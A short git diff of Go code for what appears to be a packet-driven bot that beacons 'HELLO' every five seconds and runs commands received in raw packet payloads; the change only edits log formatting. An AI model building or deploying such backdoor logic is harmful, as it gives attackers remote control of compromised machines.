@@ -23,7 +23,7 @@ func sendHello(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.Hardware
 		addr := cattails.CreateAddrStruct(iface)
 
 		cattails.SendPacket(fd, iface, addr, packet)
-		fmt.Println("\n[+] Sent HELLO")
+		fmt.Println("[+] Sent HELLO")
 		// Send hello every 5 seconds
 		time.Sleep(5 * time.Second)
 	}
@@ -31,21 +31,21 @@ func sendHello(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.Hardware
 
 func botProcessPacket(packet gopacket.Packet) {
 
-	fmt.Println("\n[+] Payload Received")
+	fmt.Println("[+] Payload Received")
 	data := string(packet.ApplicationLayer().Payload())
 	data = strings.Trim(data, "\n")
 
 	payload := strings.Split(data, " ")
-	fmt.Println("\n[+] PAYLOAD:", payload)
+	fmt.Println("[+] PAYLOAD:", payload)
 	command := payload[1]
 	args := payload[2:]
 
-	fmt.Println("\n[+] ARGS:", args)
+	fmt.Println("[+] ARGS:", args)
 	out, err := exec.Command(command, args...).Output()
 	if err != nil {
 		fmt.Println("\n[-] ERROR:", err)
 	}
-	fmt.Println("\n[+] OUTPUT:", string(out))
+	fmt.Println("[+] OUTPUT:", string(out))
 }
 
 func main() {
